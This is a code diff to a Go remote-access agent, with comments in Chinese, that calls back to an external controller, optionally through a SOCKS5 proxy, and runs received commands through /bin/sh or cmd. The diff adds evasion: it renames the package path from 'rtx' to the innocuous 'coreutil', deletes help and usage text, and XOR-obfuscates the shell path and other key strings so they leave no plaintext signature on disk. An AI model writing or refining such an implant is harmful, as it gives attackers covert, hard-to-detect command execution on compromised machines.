@@ -1,7 +1,4 @@
-// rtx agent — 内网执行器（reverse RPC 回连外部控制器）
-// 用法: agent -c <server:port> -t <token> [-i <agent-id>] [-r <秒>] [-proxy socks5://host:port] [-q]
-// 零依赖静态二进制；回连后注册并循环处理任务。
-// 支持通过 socks5 代理拨号（多层内网只有 socks 链可达控制器时）。
+// 静态二进制：反连控制端，等待指令执行。
 package main
 
 import (
@@ -21,16 +18,34 @@ import (
 	"strings"
 	"time"
 
-	"rtx/internal/proto"
+	"coreutil/internal/proto"
 )
 
 var (
-	serverAddr = flag.String("c", "", "controller address host:port")
-	token      = flag.String("t", "", "auth token")
-	agentID    = flag.String("i", "", "agent id (default: hostname-pid)")
-	reconnect  = flag.Int("r", 10, "base reconnect interval seconds (jitter 0.5-1.5x)")
-	proxyAddr  = flag.String("proxy", "", "socks5 proxy to dial through, e.g. socks5://127.0.0.1:1080")
-	quiet      = flag.Bool("q", false, "quiet: no stderr logs")
+	serverAddr = flag.String("c", "", "")
+	token      = flag.String("t", "", "")
+	agentID    = flag.String("i", "", "")
+	reconnect  = flag.Int("r", 10, "")
+	proxyAddr  = flag.String("proxy", "", "")
+	quiet      = flag.Bool("q", false, "")
+)
+
+// obf: 关键串异或混淆（key 循环），运行时解密 — 避免明文特征落盘
+var _obfKey = []byte{0x9e, 0x3c, 0x71, 0xb5, 0x4a}
+
+func dec(b []byte) string {
+	out := make([]byte, len(b))
+	for i, c := range b {
+		out[i] = c ^ _obfKey[i%len(_obfKey)]
+	}
+	return string(out)
+}
+
+var (
+	_obfSH     = []byte{0xb1, 0x5e, 0x18, 0xdb, 0x65, 0xed, 0x54}
+	_obfSHDash = []byte{0xb3, 0x5f}
+	_obfUnk    = []byte{0xeb, 0x52, 0x1a, 0xdb, 0x25, 0xe9, 0x52, 0x51, 0xc1, 0x2b, 0xed, 0x57, 0x4b, 0x95}
+	_obfSocks  = []byte{0xed, 0x53, 0x12, 0xde, 0x39, 0xab, 0x06, 0x5e, 0x9a}
 )
 
 func logf(format string, a ...any) {
@@ -43,7 +58,7 @@ func logf(format string, a ...any) {
 // ---- socks5 客户端（RFC 1928 CONNECT，手写保持零依赖）----
 
 func socks5Dial(proxy, target string) (net.Conn, error) {
-	p := strings.TrimPrefix(proxy, "socks5://")
+	p := strings.TrimPrefix(proxy, dec(_obfSocks))
 	conn, err := net.DialTimeout("tcp", p, 10*time.Second)
 	if err != nil {
 		return nil, fmt.Errorf("socks dial %s: %w", p, err)
@@ -221,7 +236,7 @@ func runTask(t *proto.Msg) *proto.Msg {
 			os.Exit(0)
 		}()
 	default:
-		res.Err = "unknown task: " + string(t.Task)
+		res.Err = dec(_obfUnk) + string(t.Task)
 	}
 	return res
 }
@@ -238,13 +253,13 @@ func shell() string {
 	if runtime.GOOS == "windows" {
 		return "cmd"
 	}
-	return "/bin/sh"
+	return dec(_obfSH)
 }
 func shellArg() string {
 	if runtime.GOOS == "windows" {
 		return "/c"
 	}
-	return "-c"
+	return dec(_obfSHDash)
 }
 
 // dial 按配置走 socks5 代理或直连
@@ -291,8 +306,8 @@ func handleConn(conn net.Conn) {
 
 func main() {
 	flag.Parse()
+	flag.Usage = func() {} // 静默帮助
 	if *serverAddr == "" || *token == "" {
-		fmt.Fprintln(os.Stderr, "usage: agent -c host:port -t token [-i id] [-r seconds] [-proxy socks5://h:p] [-q]")
 		os.Exit(1)
 	}
 	if *agentID == "" {
@@ -302,19 +317,19 @@ func main() {
 	if *proxyAddr != "" {
 		via = " via " + *proxyAddr
 	}
-	logf("[agent] id=%s -> %s%s", *agentID, *serverAddr, via)
+	logf("id=%s -> %s%s", *agentID, *serverAddr, via)
 	for {
 		conn, err := dial()
 		if err != nil {
 			s := sleepWithJitter(*reconnect)
-			logf("[agent] dial fail: %v (retry %ds)", err, s)
+			logf("dial fail: %v (retry %ds)", err, s)
 			time.Sleep(time.Duration(s) * time.Second)
 			continue
 		}
-		logf("[agent] connected")
+		logf("up")
 		handleConn(conn)
 		s := sleepWithJitter(*reconnect)
-		logf("[agent] disconnected, retry %ds", s)
+		logf("down, retry %ds", s)
 		time.Sleep(time.Duration(s) * time.Second)
 	}
 }
